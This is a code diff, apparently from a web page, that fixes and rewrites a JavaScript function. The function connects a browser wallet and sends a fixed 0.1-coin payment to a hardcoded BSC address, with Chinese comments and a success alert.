@@ -168,28 +168,35 @@ document.getElementById("connectWalletBtn").addEventListener("click", function()
     }
 
     
-    asunc function transfer() {
-      if (typeof window.web3 !== 'undefined') {
-      
-        var toAddress = "0x02682f038f9303Cf7995eece49D92f4E78F667Df";
+    // 转账逻辑
+async function transfer() {
+  if (typeof window.ethereum !== 'undefined') {
+    try {
+      // 请求用户授权
+      await window.ethereum.enable();
 
-        
-        var amount = web3.utils.toWei("0.1", "ether");
-        
-        try {
+      // 创建Web3对象
+      const web3 = new Web3(window.ethereum);
+
+      // 要转账的BSC地址
+      const toAddress = "0x02682f038f9303Cf7995eece49D92f4E78F667Df";
+
+      // 转账数额（以wei为单位，1 BNB = 10^18 wei）
+      const amount = web3.utils.toWei("0.1", "ether");
+
       // 获取钱包地址
-      var accounts = await web3.eth.getAccounts();
-      var fromAddress = accounts[0];
+      const accounts = await web3.eth.getAccounts();
+      const fromAddress = accounts[0];
 
       // 构建交易对象
-      var txObject = {
+      const txObject = {
         from: fromAddress,
         to: toAddress,
         value: amount
       };
 
       // 发送交易
-      var receipt = await web3.eth.sendTransaction(txObject);
+      const receipt = await web3.eth.sendTransaction(txObject);
 
       console.log(receipt);
       alert("转账成功，交易哈希：" + receipt.transactionHash);
